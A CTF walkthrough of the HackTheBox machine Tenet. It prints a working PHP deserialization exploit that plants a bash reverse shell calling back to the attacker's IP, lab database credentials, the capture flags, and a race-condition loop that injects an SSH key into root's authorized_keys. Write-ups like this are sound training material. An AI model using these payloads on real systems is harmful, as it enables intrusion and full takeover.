---
title: Tenet HackTheBox Machine Writeup and Walkthrough
author: Gaurav Raj
date: 2021-05-14 10:02:00 +0800
categories: [CTF, HackTheBox]
tags: [ctf, hackthebox, htb, writeup, walkthrough, shellscripting, ssh-keygen, thehackersbrain, nmap]
image:
  src: /assets/tenet/images/banner.jpg
  alt: Tenet Banner Image
---

## Tenet
> HackTheBox Medium Level Machine

## Target IP
```
export IP=10.10.10.223
```

## Nmap Scan
```
# Nmap 7.80 scan initiated Wed May 12 11:48:15 2021 as: nmap -sC -sV -A -v -oN initial 10.10.10.223
Nmap scan report for 10.10.10.223
Host is up (0.22s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 12 11:49:02 2021 -- 1 IP address (1 host up) scanned in 47.18 seconds
```

## HTTP Port Enumeartion
After visiting the website found that was the there was the default page of ubuntu apache2 server running. So next thing to do, ran a gobuster scan to find if we have any hidden directory.

### Gobuster Scan
```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.223/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirb/wordlists/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
/wordpress (Status: 301)
=====================================================
=====================================================
```

and here we found and `/wordpress` directory and while cheking the source of the wordpress endpoint got a domain name `tenet.htb`. so let's add them in `/etc/hosts` or in `C:\Windows\System32\Drivers\etc\hosts` in case of windows.

There's a wordpress site running on the wordpress endpoint. While enumerating the site found a comment on a post called `Migration` which contains a comment saying something about `sator` php file, let's check if we have access to that file.
<!-- ![[Pasted image 20210513130728.png]] -->
![Sator PHP File](/assets/tenet/images/sator.png)

here we found the `sator.php` file, but it isn't much helpful, let's check if we have any backup of the file.
<!-- ![[Pasted image 20210513130935.png]] -->
![Sator PHP File Backup](/assets/tenet/images/sator_backup.png)

and here we found a backup version of `sator.php` file let's check what's inside.
<!-- ![[Pasted image 20210513131045.png]] -->
![Sator PHP File Backup New](/assets/tenet/images/sator_backup_new.png)


looks like we have to perform some `php deserialization` 

## Reverse Shell

so let's write a script to exploit the `php deserialization` and get a reverse shell.

hackersbrain.php
```php
<?php
class DatabaseExport
{
    public $user_file = 'hackersbrain.php';
    public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.24/4444 0>&1\'"); ?>';

        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated';
        }
}

$url = 'http://10.10.10.223/sator.php?arepo=' . urlencode(serialize(new DatabaseExport));
$response = file_get_contents("$url");
$response = file_get_contents("http://10.10.10.223/hackersbrain.php");

?>
```

and here we got our shell
```
[elliot@archlinux]  tenet git:(main) ✗ nc -nvlp 4444
Connection from 10.10.14.24:54168
^CExiting.
[elliot@archlinux]  tenet git:(main) ✗ nc -nvlp 4444
Connection from 10.10.10.223:62488
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@tenet:/var/www/html$ ^Z
[1]  + 5645 suspended  nc -nvlp 4444
[elliot@archlinux]  tenet git:(main) ✗ stty raw -echo; fg
[1]  + 5645 continued  nc -nvlp 4444

www-data@tenet:/var/www/html$ export TERM=xterm-256color
www-data@tenet:/var/www/html$ clear
www-data@tenet:/var/www/html$ ls
dedsec.php        index.html  sator.php.bak  users.txt
hackersbrain.php  sator.php   shell.php      wordpress
www-data@tenet:/var/www/html$ cat users.txt
Successwww-data@tenet:/var/www/html$

```

## User Flag

and here we found the `wp-config.php` file from `wordpress` directory.

wp-config.php
```php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'WP_HOME', 'http://tenet.htb');
define( 'WP_SITEURL', 'http://tenet.htb');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'QiuK;~(mBy7H3y8G;*|^*vGekSuuxKV$:Tc>5qKr`T}(t?+`r.+`gg,Ul,=!xy6d' );
define( 'SECURE_AUTH_KEY',  'x3q&hwYy]:S{l;jDU0D&./@]GbBz(P~}]y=3deqO1ZB/`P:GU<tJ[v)4><}wl_~N' );
define( 'LOGGED_IN_KEY',    'JrJ_u34gQ3(x7y_Db8`9%@jq<;{aqQk(Z+uZ|}M,l?6.~Fo/~Tr{0bJIW?@.*|Nu' );
define( 'NONCE_KEY',        '=z0ODLKO{9K;<,<gT[f!y_*1QgIc;#FoN}pvHNP`|hi/;cwK=vCwcC~nz&0:ajW#' );
define( 'AUTH_SALT',        '*.;XACYRMNvA?.r)f~}+A,eMke?/i^O6j$vhZA<E5Vp#N[a{YL TY^-Q[X++u@Ab' );
define( 'SECURE_AUTH_SALT', 'NtFPN?_NXFqW-Bm6Jv,v-KkjS^8Hz@BIcxc] F}(=v1$B@F/j(`b`7{A$T{DG|;h' );
define( 'LOGGED_IN_SALT',   'd14m0mBP eIawFxLs@+CrJz#d(88cx4||<6~_U3F=aCCiyN|]Hr{(mC5< R57zmn' );
define( 'NONCE_SALT',       'Srtt&}(~:K(R(q(FMK<}}%Zes!4%!S`V!KSk)Rlq{>Y?f&b`&NW[INM2,a9Zm,SH' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

?>
```

using the credentials specified in the `wp-config.php` file got shell as user `neil`
credentials: `neil:Opera2112`

and here is the user flag

user.txt
```
2d066b2c36fda6f3e98dde1d88aeffbc
```

## Privilege Escalation

Checking the `sudo` privileges of our user found the user `neil` can run `enableSSH.sh` script as `root` user.

```
neil@tenet:~$ sudo -l
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
```

enableSSH.sh
```bash
#!/bin/bash

checkAdded() {

        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

                /bin/echo "Successfully added $sshName to authorized_keys file!"

        else

                /bin/echo "Error in adding $sshName to authorized_keys file!"

        fi

}

checkFile() {

        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

                /bin/echo "Error in creating key file!"

                if [[ -f $1 ]]; then /bin/rm $1; fi

                exit 1

        fi

}

addKey() {

        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

        (umask 110; touch $tmpName)

        /bin/echo $key >>$tmpName

        checkFile $tmpName

        /bin/cat $tmpName >>/root/.ssh/authorized_keys

        /bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```

as we can see in the `enableSSH.sh` file, the script is adding `/tmp/ssh-xxxxx` files with random names on the `authorized_keys` of `root` user, so let's create a `ssh-key` and try to add it in the `authorized_keys`.

so we need to run a while loop infinitely so and let's try if our `ssh` keys file will we added in the `authorized_keys` file.

here we created the ssh-key file and here's the content of `id_rsa.pub` file with the for loop.

```sh
while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEFgj+03zyYXCwJmVEUOB1dN+4iVfBEmv++UnHvWADrPdENdaoaE7syhMP+sKusDNFCPNDcFn/BbzW7Jm9Bcue2HIhp7krPq2C0E8ojCloz2sWkdP8qoXlDmc6AdOYYOskjuBwH9obuGI94eyEetxi7rZdKrDvYowtpls2hXxup28sl59tgbRqIqM6dvTg8E9PRuJCe9A9HDX4zd5Vh6MtxnKt3J81ja7hztoS59ur0sDa67FqUA4fvc5RJxjS6xL/fqHNBCFmXl8ZfDLy386XdPB9NFwBBnNYAbBlPbipmiZ+rKhMbUsZJbLCb4caBrA0F+HzXsetMVvSVs1BXmEAoKoTaycA58qD6rCkLzA5AX6CX61rJKYw9q7notrtoXRx4inysRLb7AoNdX/xqqiUdUeXRvKXu3mtXgir+gX3ECsn2WB4caZw1Kf6RUGDD0L+TrPGwyPpQHOZz99NxyYTOfegMLV4vKKeOakpALFs9UGOg2CvPoCKwvDOiwI5mzk= elliot@archlinux" | tee /tmp/ssh* > /dev/null; done
```

now run the `enableSSH.sh` script multiple time in order to get our script added.
```bash
sudo /usr/local/bin/enableSSH.sh
```

and here our file is added on the `authorized_keys` of the `root` user, let's try to ssh using our `id_rsa`
<!-- ![[Pasted image 20210513135631.png]] -->
![authorized_keys](/assets/tenet/images/authorized_keys.png)

and boom here we can now ssh to `tenet` as root user using our specified keys.
<!-- ![[Pasted image 20210513134902.png]] -->
![authorized_keys](/assets/tenet/images/rootshell.png)


## Root Flag

and here we got the `root` flag
```
root@tenet:~# cat root.txt
fe77cbe8b24134e0111108f8a66087d0
root@tenet:~#
```

root.txt
```
fe77cbe8b24134e0111108f8a66087d0
```


and Tenet Machine is hacked Successfully...
